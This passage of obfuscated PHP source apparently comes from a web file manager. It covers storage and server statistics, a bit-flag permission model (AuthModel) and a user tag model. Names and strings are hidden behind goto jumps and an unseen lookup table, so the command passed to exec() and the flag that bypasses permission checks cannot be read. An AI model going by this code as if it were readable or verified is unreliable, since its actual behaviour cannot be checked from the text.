($aʵ - $fݨ), $Aԋ[2027] => (int) $fݨ, $Aԋ[2028] => (int) $c靹, $Aԋ[2029] => $E􌐾); goto dͽܡժ; f: if (!$E􌐾) { $E􌐾 = 1; } $E󃺋 = strtotime(date($Aԋ[2004])); $aǥ⠜ = array($Aԋ[2025] => array($Aԋ[913], $E󃺋)); goto cԃ; f᰹: $E󃺋 = strtotime($Aԋ[2024]); $aǥ⠜ = array($Aԋ[2025] => array($Aԋ[913], $E󃺋)); $E􌐾 = (int) Model($Aԋ[473])->where($aǥ⠜)->count($Aԋ[1404]); goto f; aѻů: $Aԋ =& $_SERVER[ԥ]; $aʵ = Model($Aԋ[473])->count($Aԋ[1404]); $fݨ = Model($Aԋ[473])->where($Aԋ[2023])->count($Aԋ[1404]); goto f᰹; dͽܡժ: } private function optionFile() { goto D⣶; D⣶: $f =& $_SERVER[ԥ]; $eřӇ = $this->sourceSize(); $dͧ = $eřӇ[$f[77]]; goto b䱼; Bޤݢ: $D = Model($f[744])->where($cί֊)->sum($f[77]); $d = Model($f[744])->where($cί֊)->count($f[365]); return array($f[682] => $dͧ, $f[1997] => $Cޒ, $f[2030] => $dͧ - $Cޒ, $f[2031] => (int) $D, $f[684] => (int) $D̨, $f[2032] => (int) $d); goto B; b䱼: $Cޒ = $eřӇ[$f[1997]]; $D̨ = Model($f[744])->where(array($f[366] => 0))->count($f[365]); $cί֊ = array($f[366] => 0, $f[183] => array($f[913], strtotime(date($f[2004])))); goto Bޤݢ; B: } private function optionAccess() { $E =& $_SERVER[ԥ]; return array($E[679] => $this->typeLogCnt(), $E[102] => $this->typeLogCnt($E[102]), $E[400] => $this->typeLogCnt($E[400]), $E[2033] => $this->typeLogCnt($E[2033]), $E[2034] => $this->typeLogCnt($E[2034]), $E[531] => $this->typeLogCnt($E[33], $E[2008])); } private function typeLogCnt($FŠُ = '', $E¢Ј = "\x69\x64") { goto Dݶƾܫ; Dݶƾܫ: $e¶ =& $_SERVER[ԥ]; $eì = array($e¶[102] => array($e¶[2035], $e¶[2036]), $e¶[400] => array($e¶[2037], $e¶[2038]), $e¶[2033] => array($e¶[2039], $e¶[2040]), $e¶[2034] => array($e¶[2041], $e¶[2042]), $e¶[2043] => array($e¶[2044], $e¶[2045], $e¶[2046])); $a杫뭧 = strtotime(date($e¶[2004])); goto Cڰ܄; Cڰ܄: $eя˫ = array($e¶[183] => array($e¶[913], $a杫뭧)); if ($FŠُ) { $eя˫[$e¶[29]] = array($e¶[7], $eì[$FŠُ]); } $AڃϽ = Model($e¶[2007])->where($eя˫)->count($E¢Ј); goto C; C: return (int) $AڃϽ; goto FˊȆ; FˊȆ: } private function optionServer() { goto eɛ; eɛ: $e =& $_SERVER[ԥ]; $fҏ = $this->diskDriver(); $bүꌂ = KodIO::defaultDriver(); goto Cʂ; Cʂ: $fғ = array($e[735] => $bүꌂ[$e[363]]); $e = Model($e[418])->where($fғ)->sum($e[77]); $C = explode($e[50], $_SERVER[$e[137]]); goto cТ; c۶: if ($Bǟ == $e[708]) { $A̵ = explode($e[1059], $eԜ[$e[872]]); $Bǟ = $A̵[0]; } if ($Bǟ == $e[711] || $Bǟ == $e[712]) { $eޝȃ = Model()->db()->query($e[2047]); $A = $eޝȃ[0] && isset($eޝȃ[0][$e[1311]]) ? $eޝȃ[0][$e[1311]] : 0; $Bǟ = $e[2048] . ($A ? $e[8] . $A : $e[33]); } $ḁ޹ = $GLOBALS[$e[6]][$e[333]][$e[745]]; goto Eݽ; Eݽ: return array($e[2049] => $fҏ ? $fҏ[$e[2050]] : 0, $e[2051] => $fҏ ? $fҏ[$e[2052]] : 0, $e[2053] => (int) $bүꌂ[$e[2050]] * 1024 * 1024 * 1024, $e[2054] => (int) $e, $e[2055] => ucfirst($d⽱), $e[2056] => $e[2057] . PHP_VERSION, $e[2058] => phpBuild64() ? 64 : 32, $e[678] => str_replace($e[2059], $e[889], $Bǟ), $e[333] => ucfirst($ḁ޹), $e[28] => $_SERVER[$e[2060]]); goto eϥĊ; cТ: $d⽱ = $C[0]; $eԜ = $GLOBALS[$e[6]][$e[17]]; $Bǟ = $eԜ[$e[873]]; goto c۶; eϥĊ: } private function diskDriver() { goto B; d: if ($DŠ) { $d = $A[2063]; if (function_exists($A[2064])) { exec($A[2065], $EĞ); $d = $EĞ[1] . $A[8]; } } if (!file_exists($d)) { return; } $f¡ܾ = @disk_total_space($d); goto A; A: $aӃ = $f¡ܾ - @disk_free_space($d); return array($A[2050] => $f¡ܾ, $A[2052] => $aӃ); goto cٗ; B: $A =& $_SERVER[ԥ]; $d = $A[8]; $DŠ = $GLOBALS[$A[6]][$A[2061]] == $A[2062]; goto d; cٗ: } public function fileChart($F׽ږ) { goto Aż; Aż: $Bɑי =& $_SERVER[ԥ]; if (isset($F׽ږ[$Bɑי[1404]])) { return Model($Bɑי[744])->userFileTypeProfile($F׽ږ[$Bɑי[1404]]); } if (isset($F׽ږ[$Bɑי[2066]])) { return Model($Bɑי[744])->groupFileTypeProfile($F׽ږ[$Bɑי[2066]]); } goto EݗӃ; f޲ܮ: $e[$Bɑי[367]] = 2; $a嫫 = Model($Bɑי[744])->where($e)->sum($Bɑי[77]); return array($Bɑי[682] => $Dی[$Bɑי[77]], $Bɑי[1997] => $Dی[$Bɑי[1997]], $Bɑי[1998] => (int) $Bښڗ, $Bɑי[1999] => (int) $a嫫); goto d; EݗӃ: $Dی = $this->sourceSize(); $e = array($Bɑי[457] => 0, $Bɑי[367] => 1); $Bښڗ = Model($Bɑי[744])->where($e)->sum($Bɑי[77]); goto f޲ܮ; d: } private function sourceSize() { $f =& $_SERVER[ԥ]; $C̄ʕ = Model($f[744])->where(array($f[366] => 0))->sum($f[77]); $eٺ = Model($f[418])->sum($f[77]); if ($eٺ > $C̄ʕ) { $eٺ = $C̄ʕ; } return array($f[77] => (int) $C̄ʕ, $f[1997] => (int) $eٺ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $eӯ =& $_SERVER[ԥ]; $a՝ = array(array($eӯ[382] => LNG($eӯ[2067]), $eӯ[2068] => $eӯ[2069], $eӯ[2070] => 6, $eӯ[2071] => 1, $eӯ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($eӯ[382] => LNG($eӯ[2073]), $eӯ[2068] => $eӯ[2074], $eӯ[2070] => 1, $eӯ[2071] => 1, $eӯ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($eӯ[382] => LNG($eӯ[2075]), $eӯ[2068] => $eӯ[2076], $eӯ[2070] => 2, $eӯ[2071] => 1, $eӯ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($eӯ[382] => LNG($eӯ[2077]), $eӯ[2068] => $eӯ[2076], $eӯ[2070] => 3, $eӯ[2071] => 1, $eӯ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($eӯ[382] => LNG($eӯ[2078]), $eӯ[2068] => $eӯ[2079], $eӯ[2070] => 4, $eӯ[2071] => 1, $eӯ[2072] => self::AUTH_SHOW | self::AUTH_VIEW), array($eӯ[382] => LNG($eӯ[2080]), $eӯ[2068] => $eӯ[2081], $eӯ[2070] => 5, $eӯ[2071] => 1, $eӯ[2072] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($eӯ[382] => LNG($eӯ[2082]), $eӯ[2068] => $eӯ[2083], $eӯ[2070] => 7, $eӯ[2071] => 1, $eӯ[2072] => 0)); return $a՝; } public static function authCheck($Aӎ, $E܇͇) { $Aӎ = intval($Aӎ); if (_get($GLOBALS, $_SERVER[ԥ][453])) { return !0; } if ($Aӎ <= 0) { return !1; } if (($Aӎ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Aӎ & $E܇͇); } public static function authCheckShow($aܞ֙) { return self::authCheck($aܞ֙, self::AUTH_SHOW); } public static function authCheckView($Cˉ) { return self::authCheck($Cˉ, self::AUTH_VIEW); } public static function authCheckDownload($C) { return self::authCheck($C, self::AUTH_DOWNLOAD); } public static function authCheckUpload($f) { return self::authCheck($f, self::AUTH_UPLOAD); } public static function authCheckEdit($E) { return self::authCheck($E, self::AUTH_EDIT); } public static function authCheckRemove($fˮ؄) { return self::authCheck($fˮ؄, self::AUTH_REMOVE); } public static function authCheckShare($B) { return self::authCheck($B, self::AUTH_SHARE); } public static function authCheckComment($Eړ) { return self::authCheck($Eړ, self::AUTH_COMMENT); } public static function authCheckEvent($aŢ삏) { return self::authCheck($aŢ삏, self::AUTH_EVENT); } public static function authCheckRoot($a̵) { return self::authCheck($a̵, self::AUTH_ROOT); } public static function authDisable($a꠫, $fܷ) { if (intval($a꠫) <= 0) { return 0; } return intval($a꠫) & ~$fܷ; } public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x6f\165\x72\143\x65\x41\165\164\150\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\x61\x75\164\x68", "\x6c\141\142\145\154", "\x64\x69\x73\x70\x6c\141\x79", "\x73\x79\163\x74\x65\x6d", "\x73\x6f\x72\164"); public function initData() { $B翭 = $this->authDefault(); foreach ($B翭 as $Fј) { $this->add($Fј); } } public function listData($d = false, $B = "\x73\x6f\x72\164", $Bǹ = false) { return parent::listData($d, $B, $Bǹ); } public function update($Bւ, $F) { $fэܓ =& $_SERVER[ԥ]; $dȣ = parent::listData($Bւ); $CԙÆ = $this->findByName($F[$fэܓ[28]]); if (!$dȣ || $CԙÆ && $CԙÆ[$fэܓ[363]] != $dȣ[$fэܓ[363]]) { return !1; } $this->filterAuth($F[$fэܓ[372]]); return parent::update($Bւ, $F); } public function remove($b) { $b泶摥 = parent::listData($b); if (!$b泶摥 || $b泶摥[$_SERVER[ԥ][1063]]) { return !1; } return parent::remove($b); } public function add($E = array()) { goto aŵ; aٹ: $E = array_merge($e, $E); $E[$dǖͺ[2087]] = $this->getSort(); $this->filterAuth($E[$dǖͺ[372]]); goto F; aŵ: $dǖͺ =& $_SERVER[ԥ]; if ($this->findByName($E[$dǖͺ[28]])) { return !1; } $e = array($dǖͺ[28] => $dǖͺ[33], $dǖͺ[372] => 1, $dǖͺ[2084] => $dǖͺ[2085], $dǖͺ[2086] => 1, $dǖͺ[1063] => 0, $dǖͺ[2087] => 0); goto aٹ; F: return parent::insert($E); goto F֥; F֥: } private function getSort() { $dݘ =& $_SERVER[ԥ]; $dب = parent::listData(); $dǃ = array_to_keyvalue($dب, $dݘ[33], $dݘ[2087]); return empty($dǃ) ? 0 : max($dǃ) + 1; } private function filterAuth(&$bꅤ) { goto aٝ; AɎ: foreach ($bѴ as $B͈̊) { if ($bꅤ & $B͈̊) { $Bж[] = $B͈̊; } } if (in_array(self::AUTH_ROOT, $Bж)) { $bꅤ = array_sum($bѴ); return; } $D㭭 = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto eњ; eњ: foreach ($Bж as $B͈̊) { if (isset($D㭭[$B͈̊])) { $Bж = array_merge($Bж, $D㭭[$B͈̊]); } } $Bж[] = self::AUTH_SHOW; $bꅤ = array_sum(array_unique($Bж)); goto D; aٝ: if (!$bꅤ) { return; } $bѴ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Bж = array(); goto AɎ; D: } public function sort($Bѹ, $c۪ǉ) { return parent::update($Bѹ, $c۪ǉ); } } goto AƎ; fί: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($Dפ) { $cό =& $_SERVER[ԥ]; return array($cό[2448] => array(USER_ID, $cό[2504])); } protected function listData() { $c폛 =& $_SERVER[ԥ]; $E܎ = array($c폛[1395] => USER_ID, $c폛[432] => array($c폛[2505], 0)); $d૞ = $c폛[2506]; $A̛ = $c폛[2507]; $C = $this->field($d૞)->where($E܎)->order($A̛)->select(); return $C ? $C : array(); } protected function listByTag($Fڒ) { } protected function addToTag($C㾈, $cӑ) { $e =& $_SERVER[ԥ]; if (!Model($e[2275])->listData($cӑ) || !Model($e[744])->pathInfo($C㾈)) { return !1; } $c = array($e[1395] => USER_ID, $e[432] => $cӑ, $e[383] => $C㾈, $e[384] => $e[378], $e[382] => $e[33], $e[2070] => 0); if ($this->where($c)->find()) { return !1; } return $this->add($c); } protected function removeFromTag($DႮ, $B) { $C袷 =& $_SERVER[ԥ]; if (!Model($C袷[2275])->listData($B)) { return !1; } if (is_array($DႮ)) { $DႮ = array($C袷[7], $DႮ); } $fׄ = array($C袷[1395] => USER_ID, $C袷[432] => $B, $C袷[384] => $C袷[378], $C袷[383] => $DႮ); return $this->where($fׄ)->delete(); } protected function removeByTag($a팇) { $E諥 =& $_SERVER[ԥ]; if (!$a팇) { return !1; } $F = array($E諥[1395] => USER_ID, $E諥[432] => $a팇); return $this->where($F)->delete(); } protected function removeBySource($b풙) { $bԴ =& $_SERVER[ԥ]; $Fɢ = array($bԴ[1395] => USER_ID, $bԴ[383] => $b풙, $bԴ[432] => array($bԴ[913], 0)); return $this->where($Fɢ)->delete(); } }